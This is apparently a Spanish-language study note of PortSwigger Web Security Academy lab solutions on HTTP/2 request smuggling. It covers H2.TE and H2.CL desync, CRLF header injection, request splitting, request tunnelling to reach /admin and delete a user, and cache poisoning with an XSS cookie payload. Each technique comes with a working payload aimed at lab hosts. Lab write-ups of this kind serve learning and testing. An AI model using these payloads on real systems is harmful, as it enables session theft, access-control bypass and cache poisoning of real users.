
---
Tags: #CLTE #TECL #smuggling #http #http2 #request #poisoning

---
# Índice

[[#1. Response Queue Poisoning con H2.TE (desync v10a options)]]
	[[#Explicación Técnica]]
	
[[#2. Smuggling H2.CL]]
	[[#Explicación y respuesta a tu duda (`x=1` vs `a=a`)]]
	
[[#3. Smuggling HTTP/2 por inyección CRLF (H2.CL via Header Injection)]]
	
[[#4. Splitting HTTP/2 por inyección CRLF]]
	
[[#5. Bypass de control con túnel HTTP/2 (Request Tunnelling)]]
	
[[#6. Poisoning de caché con túnel HTTP/2 - Dual Path]]
	
---
### 1. Response Queue Poisoning con H2.TE (desync v10a options)

**Concepto:** El protocolo HTTP/2 **prohíbe** la cabecera `Transfer-Encoding: chunked`. Sin embargo, algunos Front-ends son permisivos y la dejan pasar al traducirla a HTTP/1.1. El Back-end recibe la cabecera, cree que es una petición válida _chunked_ y se desincroniza.

**Tu Payload:**

```HTTP
POST /x HTTP/2
Host: 0a5b00090320a79b82fc2e9200bc008d.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: 0a5b00090320a79b82fc2e9200bc008d.web-security-academy.net


```

>!Importante los saltos de linea: `\r\n`
#### Explicación Técnica:

1. **Front-end (HTTP/2):** Ve una petición H2. En H2, la longitud del cuerpo está definida por el "frame" de datos, no por cabeceras. El Front-end lee todo el bloque (incluido el `GET /x...`) como el cuerpo de la petición.
    
2. **La Traducción (El error):** El Front-end convierte la petición a HTTP/1.1 para enviarla al Back-end. Incluye la cabecera `Transfer-Encoding: chunked` que tú pusiste (y que debería haber borrado).
    
3. **Back-end (HTTP/1.1):** Recibe la petición traducida. Ve `Transfer-Encoding: chunked`.
    
    - Lee el `0` (que pusiste justo al inicio del cuerpo).
        
    - Dice: "Fin de la petición".
        
4. **El Veneno:** El resto del cuerpo (`GET /x...`) se queda en cola.
    
5. **La Captura:** Cuando la víctima hace su petición, el Back-end responde a tu `GET /x` con un 404 (o lo que sea), pero le envía esa respuesta a la víctima. **Y la respuesta que correspondía a la víctima (su página personal con sus cookies) te la envía a ti**, porque tú estás esperando respuesta a tu petición inicial.
    

---
### 2. Smuggling H2.CL

Aquí inyectamos un `Content-Length` falso en una petición HTTP/2.

**Tu Payload:**

```HTTP
POST / HTTP/2
...
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit...net
Content-Length: 5

x=1
```

#### Explicación y respuesta a tu duda (`x=1` vs `a=a`)

En HTTP/2, la longitud es automática. Pero tú fuerzas la cabecera `Content-Length: 0`.

1. **Front-end:** Ignora tu `Content-Length: 0` porque confía en el protocolo H2. Envía todo el bloque al Back-end.
    
2. **Back-end:** Recibe la petición en HTTP/1.1 con `Content-Length: 0`. Piensa que el cuerpo está vacío y deja de leer.
    
3. **Smuggling:** La petición interna (`GET /resources...`) se queda en cola.
    

**Tu pregunta:** _"Con `x=1` funciona, pero con `a=a` no. ¿Por qué?"_

Esto es puramente matemático y tiene que ver con el `Content-Length: 5` de la **petición inyectada** (la de `/resources`). El Back-end espera **exactamente 5 bytes** de cuerpo para esa petición inyectada.

- `x` `=` `1` son **3 bytes**.
    
- Para llegar a 5, necesitas **2 bytes más**. Normalmente, estos son el salto de línea final (`\r\n`) que suelen añadir los editores o Burp Suite al final.
    
    - `x=1` (3 bytes) + `\r\n` (2 bytes) = **5 bytes**. -> **Funciona.**
        

Si pones `a=a`, matemáticamente también son 3 bytes. Si falló, puede ser por dos razones:

1. **Error humano al editar:** Quizás borraste sin querer el salto de línea final al cambiar el texto, dejando solo 3 bytes. El servidor se queda esperando los otros 2 (time-out).
    
2. **Validación de tipo:** Es menos probable en este lab, pero a veces si el cuerpo no coincide con el formato esperado, el servidor da error, aunque en smuggling suele ser un tema de longitud estricta (bytes). _Recomendación:_ Siempre verifica en el inspector "Hex" que estás enviando exactamente los bytes que declaras en el `Content-Length`.
    

---
### 3. Smuggling HTTP/2 por inyección CRLF (H2.TE via Header Injection)

**Tu duda:** _"Añado en Burp un request header en lugar de modificarlo en la petición, no entiendo la diferencia."_

Esta es la clave de todo el ataque HTTP/2 avanzado.

- **En HTTP/1.1 (Texto):** Las cabeceras se separan por saltos de línea (`\r\n`). Si tú intentas poner un salto de línea dentro del valor de una cabecera (ej: `Foo: bar\r\nEvil: 1`), el servidor lo interpreta como el fin de la cabecera `Foo` y el inicio de la cabecera `Evil`.
    
- **En HTTP/2 (Binario):** Las cabeceras son bloques de datos (frames). El protocolo permite técnicamente que dentro del **valor** de una cabecera haya caracteres `\r\n` (CRLF), porque para H2 son solo bytes, no separadores.
    

**El ataque ocurre en el Downgrade:** Tú usas el "Inspector" de Burp para inyectar `\r\n` en el valor de una cabecera H2.

1. El Front-end (H2) lo acepta: "Vale, la cabecera `Foo` tiene el valor `bar\r\nTransfer-Encoding: chunked`".
    
2. El Front-end lo traduce a HTTP/1.1 escribiendo los bytes tal cual.
    
3. **Resultado en el cable hacia el Back-end:**
    
**Tu Payload creando un Header:**

```HTTP
Name: Test
Value: test
Transfer-Encoding: chunked
```

>[!TIP] El transfer encoding se añade a traves de un header en el inspector, para introducir saltos linea dentro de una cabecera y al pasar a HTTP/1.1 la transforme en una cabecera Transfer-Encoding

Al inyectar ese valor con CRLF, el Back-end ve la cabecera `Transfer-Encoding`. Como el Front-end no la vio (estaba oculta en el valor), no la saneó. Has convertido una petición H2 segura en un ataque de desincronización clásico.


Solo quedaria completar el body de la request con la peticion smuggleada que queramos, en este caso solamente quedaría robar la cookie de session aprovechando la utilidad search de la /:

Payload en el body de la peticion (Hay que manetener la Cookie para que aparezcan las ultimas búsquedas que estan asociadas a la cookie):

```HTTP
0

POST / HTTP/1.1
Host: 0ac5006f03f783ff8458048600fe0056.web-security-academy.net
Cookie: session=oakZxcqtnevpGomZaalqkodRbjtYKx7R
Content-Length: 900

search=a
```


---
### 4. Splitting HTTP/2 por inyección CRLF

Es la evolución del anterior. En lugar de inyectar una cabecera, inyectamos **toda una petición nueva**.

**Payload:**

```HTTP
Name: Test
Value: value

GET /error HTTP/1.1
Host: 0a8c00dd03373efc82a66f47005c00f0.web-security-academy.net
```

**Explicación:**

1. Inyectamos `\r\n\r\n` (Doble salto de línea) dentro del valor de una cabecera H2.
    
2. Al traducirse a HTTP/1.1, ese doble salto significa **"Fin de las cabeceras, inicio del cuerpo"**.
    
3. Pero como estamos en una petición GET (que no suele tener cuerpo) o controlamos lo que sigue, lo que el Back-end interpreta es que la primera petición ha terminado y **empieza una segunda petición inmediatamente** (`GET /error...`).
    
4. El Front-end piensa que ha enviado 1 petición. El Back-end ve 2. La segunda se procesará y su respuesta desincronizará la cola.
    

---
### 5. Bypass de control con túnel HTTP/2 (Request Tunnelling via CRLF)

**El Concepto:** El "Request Tunnelling" ocurre cuando logramos encapsular (tunelar) una petición HTTP completa y maliciosa _dentro_ de una cabecera de una petición HTTP/2 aparentemente inofensiva. Su objetivo principal es evadir las restricciones de enrutamiento del Front-end (como reglas de firewall o bloqueos de rutas como `/admin`) y comunicarse directamente con el Back-end asumiendo roles privilegiados.

#### Fase 1: Fuga de Información (Leak de Cabeceras Internas)

Antes de tunelar, necesitamos saber cómo el Front-end se autentica con el Back-end. Los Front-ends suelen añadir cabeceras ocultas (como tokens o estados SSL) al tráfico legítimo. Para descubrirlas, forzamos al Back-end a reflejar nuestra petición. Si enviamos una petición contrabandeada hacia una función de búsqueda (ej: `/?search=x`), el Back-end reflejará las cabeceras secretas que el Front-end añadió en el cuerpo de la respuesta.

**Ejemplo de Payload para el Leak (en Burp Inspector):**

- **Método:** `POST`
    
- **Name:** 

```http
foo: bar
Content-Length: 500

search=x

```

- **Value:** `xyz`
    

_Resultado:_ El servidor devuelve un 200 OK y en el HTML refleja cabeceras como: `X-SSL-VERIFIED: 0`, `X-SSL-CLIENT-CN: null`, y `X-FRONTEND-KEY: 2419397447341318`.

#### Fase 2: Construcción del Túnel (El Payload)

Una vez tenemos las cabeceras secretas, construimos el túnel. Usamos el Inspector de Burp (asegurando que el protocolo es **HTTP/2**) para inyectar saltos de línea (`\r\n` usando `Shift+Enter`) en el **nombre** de una cabecera arbitraria.

**Ejemplo de Payload del Túnel (en Burp Inspector):**

- **Pseudo-cabeceras:** `:method` a `HEAD` (Vital para evitar que el cuerpo de la respuesta externa interfiera).
    
- **Name:**

```HTTP
foo: bar

GET /admin HTTP/1.1
Host: 0af100c1043a60a08173f20b0013006a.web-security-academy.net
cookie: session=NsrUHt2xlMORhUZ3fCz5ttTOXO3wVHcP
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 2081816987106306


```
   
- **Value:** `xyz`
    

#### Fase 3: El problema del "Buffer" (Error de Bytes)

**El Error:** Al lanzar el payload anterior, el servidor devuelve: `Server Error: Received only 4454 of expected 9457 bytes of data`. **Explicación Técnica:** El Front-end lee la respuesta del Back-end basándose en el `Content-Length` del recurso externo que pedimos. Si nuestra petición externa pide la raíz (`/`), el Front-end espera una respuesta de, digamos, 4000 bytes. Pero nuestro túnel interno pidió `/admin`, que pesa 9000 bytes. El Front-end corta la conexión prematuramente porque la respuesta es más grande de lo esperado, rompiendo el túnel.

**La Solución (Ajuste de Path):** Debemos pedir en la petición externa un recurso cuya respuesta legítima sea **más corta** que el recurso tunelado.

- Cambiamos el pseudo-header `:path` de `/` a `/login`.
    
- Al reenviar la petición, el túnel se mantiene estable y el HTML del panel `/admin` aparece anidado dentro del cuerpo de la respuesta de `/login`.
    

#### Fase 4: Ejecución (Kill Chain)

Al leer el HTML filtrado de `/admin`, descubrimos el endpoint de borrado de usuarios. Modificamos la petición interna del túnel para ejecutar la acción destructiva con privilegios escalados.

**Payload Final (Kill Chain):**

- **Name:**
    
    
    ```HTTP
    foo: bar\r\n
    \r\n
    GET /admin/delete?username=carlos HTTP/1.1\r\n
    X-SSL-VERIFIED: 1\r\n
    X-SSL-CLIENT-CN: administrator\r\n
    X-FRONTEND-KEY: 2419397447341318\r\n
    \r\n
    ```
    
- **Resultado:** El usuario "carlos" es eliminado, evadiendo completamente las defensas perimetrales del Front-end.
---
### 6. Poisoning de caché con túnel HTTP/2 - Dual Path

#### Paso 1: Identificación y Análisis (Footprinting)

Antes de atacar, necesitamos conocer los límites del servidor.

1. **Captura de línea base:** Envía una petición `GET /` al **Repeater**.
    
2. **Verificación de Protocolo:** Asegúrate de que en el Inspector el protocolo sea **HTTP/2**.
    
3. **Medición del objetivo:** Mira la pestaña **Response**. Anota el valor de `Content-Length`.
    
    - _Ejemplo:_ Si el `Content-Length` de la home es **10,500**, tu payload inyectado deberá devolver una respuesta más larga que eso para evitar el _Timeout_.
        

---

#### 🧪 Paso 2: Test de Inyección en `:path`

Probamos si el "Front-end" permite inyectar saltos de línea (`\r\n`) en el pseudo-header `:path`.

1. En el **Inspector** -> **Request Attributes** -> **Path**, introduce:
    

```HTTP
/?search=x HTTP/1.1
Foo: bar


```

    
2. Si el servidor responde `200 OK`, confirmas que el Front-end es vulnerable a la inyección de cabeceras en el downgrade a HTTP/1.1.
    

>[!IMPORTANT] Hasta aquí se usa `GET` y a partir del siguiente se usa `HEAD` como método

---

#### 🏗️ Paso 3: Construcción del Túnel (Request Tunnelling)

Ahora intentamos que el Backend reciba una petición completa "escondida". Usamos el método **HEAD** en la petición principal para facilitar la visualización de la respuesta inyectada.

**Configuración en el Inspector (:path):**


```HTTP
/ HTTP/1.1
Host: 0a9e009804f01c0f80e9032200070064.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Foo: bar


```

> [!IMPORTANT] El `Foo: bar` al final es fundamental. Sirve para capturar cualquier "basura" o sufijo que el Front-end añada automáticamente, evitando que rompa tu petición inyectada.
> Acordarse de poner los `\r\n` al final.

---

#### 💀 Paso 4: El Payload de XSS y el Envenenamiento

Aquí aplicamos tu ejemplo de `/resources` y el Padding de "A".

1. **Localización del Gadget:** Sabemos que `/resources?<payload>` refleja contenido sin filtrar.
    
2. **Cálculo del Padding:** Como la respuesta de la Home es larga, añadimos las `AAAA...` para que la respuesta del script "pese" más que la respuesta original de la Home.
    
3. **Configuración Final en :path:**
    

```HTTP
/ HTTP/1.1
Host: 0a9900100460920e85f4767100d300a9.web-security-academy.net

GET /resources?<script>alert(document.cookie)</script>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Foo: bar


```

_(Asegúrate de poner suficientes 'A' para superar el Content-Length que anotaste en el Paso 1)._

---

#### 🎯 Paso 5: Explotación (Cache Poisoning)

Para que la víctima ejecute el código, debemos "pisar" la caché de la página principal.

1. **Elimina cualquier Cache-Buster:** Asegúrate de que el path inyectado apunte a `/` y no a `/?search=x`.
    
2. **Envío en ráfaga (Intruder):** * Envía la petición al **Intruder**.
    
    - Configura el ataque en modo **Null Payloads** y ponlo a correr de forma continua.
        
    - Esto mantendrá la caché "envenenada" con tu respuesta maliciosa.
        
3. **Verificación:** Carga la URL principal del laboratorio en un navegador limpio.
    
    - Si ves `X-Cache: hit` y salta el alert: **Misión cumplida.**

---